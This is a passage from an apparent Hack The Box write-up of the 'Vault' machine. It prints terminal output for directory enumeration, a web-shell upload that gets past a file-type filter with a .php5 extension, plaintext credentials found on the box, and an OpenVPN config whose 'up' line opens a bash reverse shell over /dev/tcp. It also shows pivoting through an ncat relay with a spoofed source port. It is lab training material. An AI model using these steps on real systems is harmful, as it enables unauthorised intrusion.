</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.129.121.48/sparklays/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/admin.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 615<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/design               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 325<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.121.48/sparklays/design/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/login.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">40938</span> / <span style="color:#ae81ff">40940</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/vault<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.129.121.48/sparklays/design/ -w /usr/share/wordlists/dirb/big.txt -x .php,.html  
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.129.121.48/sparklays/design/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php,html
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/design.html          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 72<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 333<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.121.48/sparklays/design/uploads/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">61407</span> / <span style="color:#ae81ff">61410</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p>Awesome, looks like we have something we can work with&hellip; the <code>/sparklays/admin.php</code> and <code>/sparklays/design/design.html</code> endpoints look like a good start point.</p>
<p><img src="/images/vault3.png" alt="vault3"></p>
<p><img src="/images/vault4.png" alt="vault4"></p>
<h2 id="initial-access">Initial Access</h2>
<h3 id="file-upload-sparklaysdesignchangelogophp">File Upload: /sparklays/design/changelogo.php</h3>
<p>Let&rsquo;s try and upload a web shell and see what happens.</p>
<p><img src="/images/vault5.png" alt="vault5"></p>
<p>Let&rsquo;s try all the different methods to bypass this filetype check.</p>
<ol>
<li>Intercepting the request and changing the MIME type: <strong>Nope</strong></li>
<li>Change the filetype: <strong>Bingo!</strong>
In this instance, we had success with a <code>.php5</code> extension.</li>
</ol>
<p><img src="/images/vault6.png" alt="vault6"></p>
<p>Now navigate to your file at <code>http://10.129.121.48/sparklays/design/uploads/shell.php5</code> and make sure you have your listener running. Enjoy your shell!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/vault<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nc -nvlp <span style="color:#ae81ff">4444</span> 
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.142<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.121.48<span style="color:#f92672">]</span> <span style="color:#ae81ff">36478</span>
</span></span><span style="display:flex;"><span>Linux ubuntu 4.13.0-45-generic <span style="color:#75715e">#50~16.04.1-Ubuntu SMP Wed May 30 11:18:27 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span> 12:33:27 up <span style="color:#ae81ff">43</span> min,  <span style="color:#ae81ff">0</span> users,  load average: 0.01, 0.01, 0.02
</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#ae81ff">\&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span>$ whoami
</span></span><span style="display:flex;"><span>www-data
</span></span></code></pre></div><h2 id="shell-as-www-data">Shell as www-data</h2>
<p>Doing some filesystem enumeration, we find that we have access to <code>dave</code>&rsquo;s home folder, and some interesting files within.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@ubuntu:/home/dave/Desktop$ ls -al
</span></span><span style="display:flex;"><span>ls -al
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> dave dave <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2021</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> dave dave <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2021</span> ..
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> alex alex   <span style="color:#ae81ff">74</span> Jul <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> Servers
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> alex alex   <span style="color:#ae81ff">14</span> Jul <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> key
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> alex alex   <span style="color:#ae81ff">20</span> Jul <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> ssh
</span></span><span style="display:flex;"><span>www-data@ubuntu:/home/dave/Desktop$ cat Servers
</span></span><span style="display:flex;"><span>cat Servers
</span></span><span style="display:flex;"><span>DNS + Configurator - 192.168.122.4
</span></span><span style="display:flex;"><span>Firewall - 192.168.122.5
</span></span><span style="display:flex;"><span>The Vault - x
</span></span><span style="display:flex;"><span>www-data@ubuntu:/home/dave/Desktop$ cat key
</span></span><span style="display:flex;"><span>cat key
</span></span><span style="display:flex;"><span>itscominghome
</span></span><span style="display:flex;"><span>www-data@ubuntu:/home/dave/Desktop$ cat ssh
</span></span><span style="display:flex;"><span>cat ssh
</span></span><span style="display:flex;"><span>dave
</span></span><span style="display:flex;"><span>Dav3therav3123
</span></span></code></pre></div><p>Going off the filename <code>ssh</code>, let&rsquo;s try an SSH connection as <code>dave:Dav3therav3123</code></p>
<h2 id="shell-as-dave">Shell as dave</h2>
<h3 id="network-2">Network #2</h3>
<p>As I was enumerating this machine, noticed a separate ethernet adaptor and totally different IP. It just so happened to line up with the network <code>DNS + Configurator</code> and <code>Firewall</code> were on, based on the documents on Dave&rsquo;s desktop: <code>192.168.122.0/24</code>.  We should explore this other network.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@ubuntu:~$ ifconfig
</span></span><span style="display:flex;"><span>ens192    Link encap:Ethernet  HWaddr 00:50:56:b0:6f:cb  
</span></span><span style="display:flex;"><span>          inet addr:10.129.121.48  Bcast:10.129.255.255  Mask:255.255.0.0
</span></span><span style="display:flex;"><span>          inet6 addr: fe80::250:56ff:feb0:6fcb/64 Scope:Link
</span></span><span style="display:flex;"><span>          inet6 addr: dead:beef::250:56ff:feb0:6fcb/64 Scope:Global
</span></span><span style="display:flex;"><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span></span><span style="display:flex;"><span>          RX packets:741357 errors:0 dropped:0 overruns:0 frame:0
</span></span><span style="display:flex;"><span>          TX packets:684399 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:1000 
</span></span><span style="display:flex;"><span>          RX bytes:110262678 <span style="color:#f92672">(</span>110.2 MB<span style="color:#f92672">)</span>  TX bytes:308938643 <span style="color:#f92672">(</span>308.9 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>lo        Link encap:Local Loopback  
</span></span><span style="display:flex;"><span>          inet addr:127.0.0.1  Mask:255.0.0.0
</span></span><span style="display:flex;"><span>          inet6 addr: ::1/128 Scope:Host
</span></span><span style="display:flex;"><span>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span></span><span style="display:flex;"><span>          RX packets:713 errors:0 dropped:0 overruns:0 frame:0
</span></span><span style="display:flex;"><span>          TX packets:713 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:1000 
</span></span><span style="display:flex;"><span>          RX bytes:64705 <span style="color:#f92672">(</span>64.7 KB<span style="color:#f92672">)</span>  TX bytes:64705 <span style="color:#f92672">(</span>64.7 KB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49  
</span></span><span style="display:flex;"><span>          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
</span></span><span style="display:flex;"><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span></span><span style="display:flex;"><span>          RX packets:34 errors:0 dropped:0 overruns:0 frame:0
</span></span><span style="display:flex;"><span>          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:1000 
</span></span><span style="display:flex;"><span>          RX bytes:2296 <span style="color:#f92672">(</span>2.2 KB<span style="color:#f92672">)</span>  TX bytes:1131 <span style="color:#f92672">(</span>1.1 KB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...snip...<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@ubuntu:~$ netstat -ano
</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:5902          0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 192.168.122.1:53        0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:631           0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:5900          0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:5901          0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 192.168.122.1:38330     192.168.122.4:80        TIME_WAIT   timewait <span style="color:#f92672">(</span>23.44/0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 10.129.121.48:22        10.10.14.142:40752      ESTABLISHED keepalive <span style="color:#f92672">(</span>6673.84/0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">216</span> 10.129.121.48:22        10.10.14.142:47562      ESTABLISHED on <span style="color:#f92672">(</span>0.05/0/0<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>We can also see a connection between this machine and the <code>DNS + Configurator</code> machine on <code>192.168.122.4:80</code>. A web server perhaps? Let&rsquo;s do a little more digging before checking that out. I&rsquo;ll transfer a standalone binary of <code>nmap</code> to the target machine and do some scans.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@ubuntu:~$ ./nmap -T4 192.168.122.4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 6.49BETA1 <span style="color:#f92672">(</span> http://nmap.org <span style="color:#f92672">)</span> at 2025-02-24 16:59 PST
</span></span><span style="display:flex;"><span>Unable to find nmap-services!  Resorting to /etc/services
</span></span><span style="display:flex;"><span>Cannot find nmap-payloads. UDP payloads are disabled.
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.122.4
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1203</span> closed ports
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp open  ssh
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span></code></pre></div><p>Since <code>curl</code> isn&rsquo;t installed, did a quick <code>wget</code> on the main page of <code>http://192.168.122.4/</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@ubuntu:~$ cat index.html
</span></span><span style="display:flex;"><span>&lt;h1&gt; Welcome to the Sparklays DNS Server &lt;/h1&gt;
</span></span><span style="display:flex;"><span>&lt;p&gt;
</span></span><span style="display:flex;"><span>&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dns-config.php&#34;</span>&gt;Click here to modify your DNS Settings&lt;/a&gt;&lt;br&gt;
</span></span><span style="display:flex;"><span>&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vpnconfig.php&#34;</span>&gt;Click here to test your VPN Configuration&lt;/a&gt;
</span></span></code></pre></div><h3 id="web-server-on-1921681224">Web Server on 192.168.122.4</h3>
<p>Let&rsquo;s use a local port forward via SSH to see if we can access that web server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/vault<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ssh -L 4545:192.168.122.4:80 dave@10.129.121.48
</span></span></code></pre></div><p><img src="/images/vault7.png" alt="vault7"></p>
<p>The link to modify DNS settings is broken, but the VPN configuration link works.</p>
<p><img src="/images/vault8.png" alt="vault8"></p>
<p>So we can change the contents of the <code>.ovpn</code> file&hellip; but how to get a reverse shell? A very quick Google search led me to this very informative <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da" target="_blank">article</a>. Here&rsquo;s the general payload we need to deliver:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Text" data-lang="Text"><span style="display:flex;"><span>remote 192.168.122.1     // IP of host we can reach
</span></span><span style="display:flex;"><span>dev tun                  // interface name to use
</span></span><span style="display:flex;"><span>nobind                   // because it says we have to
</span></span><span style="display:flex;"><span>script-security 2 
</span></span><span style="display:flex;"><span>up &#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.122.1/5555 0&gt;&amp;1&#39;&#34;
</span></span></code></pre></div><p><em>Keep in mind, this will create a reverse shell back to the primary box, NOT our attacker machine.</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@ubuntu:~$ nc -nvlp <span style="color:#ae81ff">5555</span>
</span></span><span style="display:flex;"><span>Listening on <span style="color:#f92672">[</span>0.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family 0, port 5555<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Connection from <span style="color:#f92672">[</span>192.168.122.4<span style="color:#f92672">]</span> port <span style="color:#ae81ff">5555</span> <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> accepted <span style="color:#f92672">(</span>family 2, sport 47202<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1100<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>root@DNS:/var/www/html#
</span></span></code></pre></div><p>Dave sure loves to save his passwords in his home directories.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@DNS:/home/dave# cat ssh
</span></span><span style="display:flex;"><span>cat ssh
</span></span><span style="display:flex;"><span>dave
</span></span><span style="display:flex;"><span>dav3gerous567
</span></span></code></pre></div><h2 id="shell-as-root-dns">Shell as root (DNS)</h2>
<p>Let&rsquo;s use Dave&rsquo;s newly found password and connect via SSH from our other SSH shell. We&rsquo;re logged in as Dave, but can quickly regain root access with a <code>sudo su</code> and Dave&rsquo;s password again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@ubuntu:~$ ssh dave@192.168.122.4
</span></span><span style="display:flex;"><span>dave@192.168.122.4s password: 
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-116-generic i686<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">98</span> packages can be updated.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50</span> updates are security updates.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Mon Sep  <span style="color:#ae81ff">3</span> 16:38:03 <span style="color:#ae81ff">2018</span>
</span></span><span style="display:flex;"><span>dave@DNS:~$ sudo su
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> dave: 
</span></span><span style="display:flex;"><span>root@DNS:/home/dave$
</span></span></code></pre></div><blockquote>
<p>Quick recap&hellip; we&rsquo;re currently in an SSH session as follows:
<code>Attacker Box --SSH as dave--&gt; Ubuntu (10.129.121.48) --SSH as dave--&gt; DNS (192.168.122.4)</code></p></blockquote>
<h3 id="enumeration">Enumeration</h3>
<p>Not a whole lot of interesting information to be found by enumerating the filesystem&hellip; or so I thought. Once I got to the <code>auth.log</code>, I was reminded that we still didn&rsquo;t know our IP address for the <code>vault</code> server. Maybe we could find something in there? Sure enough, I found an IP that didn&rsquo;t make sense:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@DNS:/var/log$ grep <span style="color:#e6db74">&#34;COMMAND&#34;</span> auth.log -a | grep <span style="color:#e6db74">&#34;192.168.5.2&#34;</span>
</span></span><span style="display:flex;"><span>Sep  <span style="color:#ae81ff">2</span> 15:07:51 DNS sudo:     dave : TTY<span style="color:#f92672">=</span>pts/0 ; PWD<span style="color:#f92672">=</span>/home/dave ; USER<span style="color:#f92672">=</span>root ; COMMAND<span style="color:#f92672">=</span>/usr/bin/nmap 192.168.5.2 -Pn --source-port<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f
</span></span><span style="display:flex;"><span>Sep  <span style="color:#ae81ff">2</span> 15:10:20 DNS sudo:     dave : TTY<span style="color:#f92672">=</span>pts/0 ; PWD<span style="color:#f92672">=</span>/home/dave ; USER<span style="color:#f92672">=</span>root ; COMMAND<span style="color:#f92672">=</span>/usr/bin/ncat -l <span style="color:#ae81ff">1234</span> --sh-exec ncat 192.168.5.2 <span style="color:#ae81ff">987</span> -p <span style="color:#ae81ff">53</span>
</span></span><span style="display:flex;"><span>Sep  <span style="color:#ae81ff">2</span> 15:10:34 DNS sudo:     dave : TTY<span style="color:#f92672">=</span>pts/0 ; PWD<span style="color:#f92672">=</span>/home/dave ; USER<span style="color:#f92672">=</span>root ; COMMAND<span style="color:#f92672">=</span>/usr/bin/ncat -l <span style="color:#ae81ff">3333</span> --sh-exec ncat 192.168.5.2 <span style="color:#ae81ff">987</span> -p <span style="color:#ae81ff">53</span>
</span></span></code></pre></div><h3 id="clever-use-of-source-port">Clever Use of Source Port</h3>
<p>Looking at the <code>auth.log</code> file and trying to recreate this connection, it seems port 987/tcp on 192.168.5.2 only responds when the source port is 4444/tcp.  Let me demonstrate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@DNS:/var/log$ nmap 192.168.5.2 -Pn -p <span style="color:#ae81ff">987</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.01 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-25 02:02 GMT
</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> Vault <span style="color:#f92672">(</span>192.168.5.2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up.
</span></span><span style="display:flex;"><span>PORT    STATE    SERVICE
</span></span><span style="display:flex;"><span>987/tcp filtered unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.08 seconds
</span></span><span style="display:flex;"><span>root@DNS:/var/log$ nmap 192.168.5.2 -Pn -p <span style="color:#ae81ff">987</span> --source-port <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.01 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-25 02:02 GMT
</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> Vault <span style="color:#f92672">(</span>192.168.5.2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0024s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
</span></span><span style="display:flex;"><span>987/tcp open  unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.24 seconds
</span></span></code></pre></div><p>Okay, let&rsquo;s connect via <code>nc</code> as demonstrated in the <code>auth.log</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@DNS:/var/log$ ncat -l <span style="color:#ae81ff">2222</span> --sh-exec <span style="color:#e6db74">&#34;ncat -p 4444 192.168.5.2 987&#34;</span>
</span></span></code></pre></div><p>Now let&rsquo;s do our double SSH connection and get back on the DNS machine in a separate terminal. We should then be able to SSH to localhost on port 2222.  I tried the last password we got for Dave (<code>dav3gerous567</code>) and luckily, it worked.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dave@DNS:~$ ssh dave@localhost -p <span style="color:#ae81ff">2222</span>
